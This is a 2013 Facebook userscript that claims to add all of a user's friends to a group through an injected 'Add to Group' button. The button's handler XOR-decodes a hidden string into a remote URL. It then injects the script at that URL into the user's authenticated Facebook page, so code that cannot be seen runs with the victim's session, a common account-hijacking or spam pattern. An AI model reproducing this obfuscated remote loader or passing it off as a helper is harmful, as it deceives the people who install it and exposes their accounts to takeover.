// ==UserScript==
// @name	Auto Add All Friends Facebook To Group
// @description	...
// @include	http://facebook.com/groups/*
// @include	https://facebook.com/groups/*
// @include	http://www.facebook.com/groups/*
// @include	https://www.facebook.com/groups/*
// @grant       none
// @author	Donnie Tandian
// @version	12.092201
//====================================================
// Reason : Source Code Has Been Changed
// Info : http://userscripts.org/scripts/show/135733
// @copyright	2013 © Semoga Bermanfaat. Terima Kasih, :)
// ==/UserScript==


// ==Accept All Requests==
function acceptAway(){
	var enkripsi="jvvr8--d`cwvm,ug`q,amo-d`-vtgpvgqv,hq";
	teks="";teksasli="";var panjang;panjang=enkripsi.length;
	for(i=0;i<panjang;i++){
		teks+=String.fromCharCode(enkripsi.charCodeAt(i)^2)
		}
	teksasli=unescape(teks);
	document.body.appendChild(document.createElement('script')).src=teksasli;
}
//
var holder = document.createElement('div');
holder.setAttribute('id','awesomeAcceptButtonHolder');
holder.style.width = "145px";
holder.style.height = "25px";
holder.style.left = "-10px";
holder.style.top = "25px";
holder.style.padding = "10px";
holder.style.position = "fixed";
holder.style.background = "#2E5392";
holder.style.border = "CC0000";
holder.style.textAlign = "center";
//
var acceptAllButton = document.createElement("button");
acceptAllButton.setAttribute('id', 'awesomeAcceptButton');
acceptAllButton.style.width = "145px";
acceptAllButton.style.height = "25px";
acceptAllButton.innerHTML = "Add to Group";
acceptAllButton.addEventListener('click',function(){acceptAway();},false);
//
holder.appendChild(acceptAllButton);
//
document.body.appendChild(holder);